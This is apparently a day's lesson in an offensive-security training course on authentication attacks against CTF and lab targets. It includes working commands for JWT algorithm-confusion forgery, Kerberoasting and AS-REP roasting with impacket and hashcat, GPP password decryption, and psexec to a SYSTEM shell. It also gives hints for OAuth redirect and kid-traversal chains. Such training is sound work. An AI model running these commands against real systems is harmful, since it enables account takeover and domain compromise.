---
title: "Auth Attacks Practice — HTB Boxes, Lab Targets, and Chaining Exercises"
tags: [practice, authentication, HackTheBox, TryHackMe, Kerberoasting, JWT, OAuth,
       ATO, Active-Directory, lab, CTF, hands-on, credential-attacks]
module: 04-BroadSurface-01
day: 179
related_topics:
  - All lessons in Days 166–178
  - Auth Attacks Competency Check (Day 180)
---

# Day 179 — Auth Attacks Practice

> "Today you do not read. Today you break things. I give you targets and a
> time window. Your job is to find the auth vulnerability, exploit it, document
> it, and tell me how to fix it — without prompting. That is the loop that
> builds skill. Everything before today was preparation. Today is the work."
>
> — Ghost

---

## Goals

By the end of today's practice session you will have:

1. Completed at least two external lab targets (HTB/THM) with authentication
   as the primary attack surface.
2. Run the full JWT attack chain from Day 170 against the local lab without
   referring to the walkthrough.
3. Run the OAuth open redirect chain from Day 172 against the local lab
   without referring to the walkthrough.
4. Practised writing a finding report for one of the attacks — under 30
   minutes from exploit confirmed to draft submitted.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| All auth attack classes | Days 166–177 |
| Review session | Day 178 |
| Local lab environments | Days 168, 170, 172 |
| HTB / THM account | External |

---

## Structure of Today

| Block | Time | Activity |
|---|---|---|
| Block 1 | 60 min | External target: web-focused auth box (HTB/THM) |
| Block 2 | 45 min | External target: AD/Kerberos box (HTB/THM) |
| Block 3 | 30 min | Local lab: JWT Day 170 — full chain, no walkthrough |
| Block 4 | 30 min | Local lab: OAuth Day 172 — full chain, no walkthrough |
| Block 5 | 30 min | Report writing: document one finding from today |
| Block 6 | 15 min | Gap analysis: what slowed you down? What did you forget? |

Adjust timing based on how far you get. Speed is not the metric — depth is.

---

## Block 1 — External Web Auth Target

### Recommended Boxes (choose one)

| Platform | Box | Auth techniques required |
|---|---|---|
| HackTheBox | **Validation** | SQLi to bypass login; session fixation |
| HackTheBox | **Secret** | JWT RS256→HS256 confusion attack |
| HackTheBox | **Encoding** | JWT alg abuse + SSTI chain |
| TryHackMe | **JWT Security** (room) | JWT forgery, alg:none, kid traversal |
| TryHackMe | **OWASP Top 10 2021** | Auth-specific tasks |
| PortSwigger Academy | **JWT attacks** (all labs) | All JWT attack classes |
| PortSwigger Academy | **OAuth 2.0** (all labs) | All OAuth attack classes |

### Methodology to Follow

Work through this order — do not skip to exploitation:

```
1. Enumerate the authentication surface:
   [ ] Find all login endpoints (web, API, admin panel)
   [ ] Find all session management endpoints (token refresh, logout)
   [ ] Find all account management endpoints (password reset, email change)
   [ ] Identify the authentication mechanism (JWT, session cookie, OAuth)

2. Passive analysis:
   [ ] Decode any JWTs — note alg, kid, custom claims
   [ ] Trace the OAuth flow if present — note redirect_uri, PKCE, state
   [ ] Check HTTP responses for leaked headers (X-User-Id, X-Role)
   [ ] Check cookie flags (Secure, HttpOnly, SameSite)

3. Active testing:
   [ ] Test the attack classes relevant to the mechanism found
   [ ] Document every test: request, response, observation
   [ ] Confirm the vulnerability before moving to exploitation

4. Exploitation:
   [ ] Demonstrate impact (minimum: account access with different privileges)
   [ ] Capture evidence (Burp history export, Python script output)

5. Document:
   [ ] Title, severity, steps, evidence, fix
```

### HTB Secret — JWT RS256→HS256 Walkthrough Outline

*(Use this as a checkpoint after your own attempt — not before.)*

The box runs a Node.js application with JWT authentication. The server issues
RS256 tokens but the verification code accepts either RS256 or HS256 depending
on the token header.

**Attack path:**

```bash
# 1. Obtain a valid JWT by registering an account
curl -s -X POST http://10.10.x.x:3000/api/user/register \
  -H "Content-Type: application/json" \
  -d '{"name":"ghost","username":"ghost","password":"ghost123"}'

curl -s -X POST http://10.10.x.x:3000/api/user/login \
  -H "Content-Type: application/json" \
  -d '{"username":"ghost","password":"ghost123"}' | jq -r '.token'
# → eyJ...

# 2. Download the public key (often served at /api/priv or found via OSINT on the repo)
curl -s http://10.10.x.x:3000/api/priv

# 3. Craft HS256 token signed with the public key as the HMAC secret
python3 - <<'EOF'
import jwt, json, base64

pub_key = open("public.pem", "rb").read()
payload = {"_id": "...", "name": "theadmin", "username": "theadmin", "iat": 1696000000}
forged = jwt.encode(payload, pub_key, algorithm="HS256")
print(forged)
EOF

# 4. Use the forged token against the admin endpoint
curl -s http://10.10.x.x:3000/api/logs \
  -H "auth-token: FORGED_TOKEN"
# → command injection in ?file parameter → RCE
```

---

## Block 2 — External AD/Kerberos Target

### Recommended Boxes

| Platform | Box | Auth techniques required |
|---|---|---|
| HackTheBox | **Forest** | AS-REP Roasting → BloodHound → DCSync |
| HackTheBox | **Sauna** | AS-REP Roasting → user enumeration |
| HackTheBox | **Active** | Kerberoasting → GPP credentials |
| HackTheBox | **Cascade** | LDAP enumeration → AD persistence |
| TryHackMe | **Attacktive Directory** | AS-REP Roasting + Kerberoasting |
| TryHackMe | **Attacking Kerberos** | Dedicated Kerberos attack room |

### HTB Active — Kerberoasting Path Outline

*(Checkpoint only — attempt first.)*

```bash
# 1. Enumerate SMB shares (Guest access allowed on this box)
smbclient -L //10.10.x.x -N
# → Replication share readable as guest

# 2. Mount and find GPP credentials
smbclient //10.10.x.x/Replication -N
# Download Groups.xml → contains cpassword (AES-256 with hardcoded key)
gpp-decrypt '<cpassword_value>'
# → SVC_TGS:GPPstillStandingStrong2k18

# 3. Kerberoast with the cracked credentials
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -dc-ip 10.10.x.x -request -output hashes.txt

# 4. Crack the Administrator TGS hash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
# → Tikr****** (crack in seconds on rockyou)

# 5. Pass the hash / login as Administrator
impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.x.x
# → SYSTEM shell
```

### AS-REP Roasting (Forest Box)

AS-REP Roasting targets accounts with `DONT_REQUIRE_PREAUTH` set — the KDC
returns an AS-REP without requiring proof of identity, and that response
is crackable offline.

```bash
# Enumerate accounts without preauth (no credentials needed)
impacket-GetNPUsers htb.local/ -dc-ip 10.10.x.x -usersfile users.txt \
  -format hashcat -outputfile asrep_hashes.txt

# Crack AS-REP hash (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Difference from Kerberoasting:**

| | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Requires auth? | Yes — any domain user | No — unauthenticated |
| Target attribute | `servicePrincipalName` set | `DONT_REQUIRE_PREAUTH` set |
| Hash type | TGS-REP (mode 13100/19600) | AS-REP (mode 18200) |
| Cracked credential | Service account password | User account password |

---

## Block 3 — JWT Lab (Day 170) — No Walkthrough

Start the lab:

```bash
cd learn-security/04-BroadSurface-01/samples/jwt-lab/
docker compose up --build -d
```

Complete all four objectives without opening the Day 170 walkthrough:

```
Objective 1: Obtain a valid JWT for a regular user account.
Objective 2: Probe the kid parameter to understand the server's key loading.
Objective 3: Forge an admin JWT using the kid path traversal technique.
Objective 4: Use the admin JWT to trigger RCE via the /admin/exec endpoint.
```

**Time yourself.** Target: under 45 minutes for all four objectives.

**If you get stuck:**

| Stuck on | Nudge |
|---|---|
| Objective 2 | The kid value is in the JWT header. What happens when you change it to a path that does not exist? |
| Objective 3 | What key does the server use when it reads from `/dev/null`? What does `open("/dev/null", "rb").read()` return? |
| Objective 4 | Look at the admin endpoint source — what does it do with the `cmd` parameter? |

---

## Block 4 — OAuth Lab (Day 172) — No Walkthrough

Start the lab:

```bash
cd learn-security/04-BroadSurface-01/samples/oauth-lab/
docker compose up --build -d
```

Complete all objectives without opening the Day 172 walkthrough:

```
Objective 1: Enumerate the OAuth server metadata and identify weaknesses.
Objective 2: Locate the open redirect on the client application.
Objective 3: Execute the full attack chain: forge redirect_uri → steal code →
             exchange for alice's token → access /admin.
Objective 4: Confirm the flag: FLAG{oauth_open_redirect_chain}
```

**Time yourself.** Target: under 30 minutes.

**If you get stuck:**

| Stuck on | Nudge |
|---|---|
| Objective 1 | Check `/.well-known/oauth-authorization-server`. What flows are enabled? Is PKCE present? |
| Objective 2 | Test `GET /logout?next=http://example.com` — does it redirect? |
| Objective 3 | The AS does `startsWith()` on the registered URI. What path under `/callback` would reach `/logout`? |

---

## Block 5 — Report Writing (30 Minutes)

Choose one finding from today's session. Write a complete report using the
Day 161 template. Hard stop at 30 minutes — do not spend more time than this.
A 30-minute draft is always better than a perfect report that never gets written.

**Minimum sections required:**

```
1. Title — [Vulnerability Class] in [Location] allows [Impact]
2. Severity — CVSS vector string + base score
3. Summary — 3–4 sentences
4. Impact — technical → operational → regulatory
5. Steps to Reproduce — numbered; anyone should be able to follow
6. PoC — working script or Burp request
7. Remediation — specific code change or configuration
```

**Quality check before finishing:**

```
[ ] Title names the class, the location, and the impact
[ ] CVSS vector is justified in the summary (not guessed)
[ ] Steps to Reproduce can be followed by someone who did not see you do it
[ ] PoC is minimal — removes all unnecessary output
[ ] Remediation is specific — not "add authentication" but the exact line to change
```

---

## Block 6 — Gap Analysis (15 Minutes)

Answer these honestly. No points for completion — only for accuracy:

```
1. Which objective took you the longest? What was the missing piece?
2. Did you need to look at any walkthrough or notes? Which ones?
3. Which attack class from Days 166–177 are you least confident about?
4. What would you do differently in the first 15 minutes of your next target?
5. Did your report take more than 30 minutes? Why? What slowed you down?
```

Write your answers down. They become your study list for any remaining gaps
before the Day 180 competency check.

---

## Additional Practice Resources

### PortSwigger Web Security Academy — Auth Labs

All labs are free and require no setup:

| Lab | Topic |
|---|---|
| JWT authentication bypass via unverified signature | alg:none |
| JWT authentication bypass via weak secret | HMAC brute force |
| JWT authentication bypass via algorithm confusion | RS256 → HS256 |
| JWT authentication bypass via kid header path traversal | kid traversal |
| OAuth 2.0 authentication vulnerabilities — all labs | Full OAuth suite |

Access at: `https://portswigger.net/web-security`

### HackTheBox — Auth-Focused Machines

| Machine | OS | Primary auth technique |
|---|---|---|
| Secret | Linux | JWT algorithm confusion |
| Encoding | Linux | JWT + SSTI chain |
| Forest | Windows | AS-REP Roasting + BloodHound |
| Active | Windows | GPP creds + Kerberoasting |
| Sauna | Windows | AS-REP Roasting + DCSync |
| StreamIO | Windows | SQL auth bypass + Active Directory |

### TryHackMe Rooms

| Room | Focus |
|---|---|
| JWT Security | All JWT attacks |
| Attacking Kerberos | Kerberoasting, AS-REP, golden ticket |
| Attacktive Directory | Full AD attack path |
| OAuth Vulnerabilities | OAuth attack surface |

---

## Key Takeaways

1. **Speed comes from pattern recognition, not memorisation.** The faster you
   identify which attack class applies to the target, the faster you exploit.
   Build that recognition by doing more reps.
2. **External boxes have noise — missing information, rabbit holes, red
   herrings.** The methodology (enumerate → analyse → test → exploit → document)
   keeps you from chasing rabbits.
3. **Report writing under time pressure is a skill.** 30 minutes for a
   complete draft is realistic for well-understood findings. If it takes longer,
   the understanding is not there yet.
4. **Gap analysis is not failure analysis.** Every gap identified today is a
   gap closed before tomorrow's competency check. Identifying the gap is the
   first step to filling it.
5. **AD attacks extend your reach from web to infrastructure.** A web bug
   that gives you a domain account is half of a Kerberoasting attack. Always
   ask: "What can I do in the directory from here?"

---

## Questions

> Add your questions here. Each question gets a Global ID (Q179.1, Q179.2 …).
> Follow-up questions use hierarchical numbering (Q179.1.1, Q179.1.2 …).

---

## Navigation

← Previous: [Day 178 — Auth Attacks Review](DAY-0178-Auth-Attacks-Review.md)
→ Next: [Day 180 — Auth Attacks Competency Check](DAY-0180-Auth-Attacks-Competency-Check.md)
